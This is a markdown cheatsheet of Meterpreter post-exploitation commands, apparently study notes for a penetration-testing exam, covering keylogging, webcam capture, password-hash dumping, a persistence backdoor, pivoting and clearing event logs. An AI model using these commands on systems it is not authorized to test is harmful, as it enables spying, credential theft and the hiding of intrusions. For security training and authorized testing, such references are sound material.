#  Meterpreter Master Cheatsheet 🐚

Meterpreter is an advanced, dynamically extensible payload that uses in-memory DLL injection. It provides you with a robust communication channel that is incredibly difficult for Antivirus software to detect because it never writes itself to the target's hard drive.



---

## 📌 Table of Contents
1. [Core System Commands](#-core-system-commands)
2. [File System Management](#-file-system-management)
3. [Network & Pivoting](#-network--pivoting)
4. [Post-Exploitation (The "Fun" Stuff)](#-post-exploitation-the-fun-stuff)
5. [Privilege Escalation & Persistence](#-privilege-escalation--persistence)

---

## 💻 Core System Commands
Once you get a `meterpreter >` prompt, start here to understand the environment.

* `sysinfo`: Displays the OS, architecture, and computer name.
* `getuid`: Shows you the username of the account you have compromised.
* `getpid`: Shows the process ID your session is running in.
* `ps`: Lists all running processes (crucial for finding processes to migrate into).
* `migrate <pid>`: Moves your session into a different process (e.g., migrate to `explorer.exe` to hide your session).

---

## 📁 File System Management
Interact with the target machine's storage like a local terminal.

* `ls`: List files in the current directory.
* `cd <dir>`: Change directory.
* `pwd`: Print working directory.
* `download <file>`: Download a file from the target to your machine.
* `upload <file>`: Upload a file from your machine to the target.
* `rm <file>`: Delete a file.
* `search -f <pattern>`: Search for specific files (e.g., `search -f *.docx`).

---

## 🌐 Network & Pivoting
Use the compromised machine to scan its internal network.

* `ipconfig` / `ifconfig`: View network interfaces.
* `arp`: View the ARP cache.
* `netstat`: View active network connections.
* `portfwd`: Forward a local port to a remote service on the target's internal network (Pivoting).
  * Example: `portfwd add -l 8080 -p 80 -r 192.168.1.5` (Forward local 8080 to target's internal IP 192.168.1.5 port 80).

---

## 🕵️ Post-Exploitation (The "Fun" Stuff)
These commands extract data from the target.

* `screenshot`: Takes a screenshot of the target's desktop.
* `keyscan_start`: Starts recording keystrokes.
* `keyscan_dump`: Dumps the captured keystrokes to your terminal.
* `keyscan_stop`: Stops the keylogger.
* `webcam_snap`: Takes a photo using the connected webcam.
* `hashdump`: Dumps the SAM database (Windows) or `/etc/shadow` (Linux) password hashes.

---

## ⬆️ Privilege Escalation & Persistence

* `getsystem`: Attempts to automatically escalate your privileges to `NT AUTHORITY\SYSTEM` (Windows).
* `run post/windows/manage/persistence_exe`: Installs a backdoor so you can reconnect even after the target reboots.
* `clearev`: Clears the Windows Event Logs (essential for "Clearing Tracks").

---

> **💡 Pro Tip for Exam:**
> Always remember to **migrate** your process! If your exploit crashes, the whole target system might crash. By migrating to a stable process like `explorer.exe` (on Windows), you ensure your session stays alive even if the original exploit process terminates.

---

⚠️ **Disclaimer:** All commands listed here are for educational purposes. Unauthorized use of these techniques on systems without explicit, written permission is a criminal offense.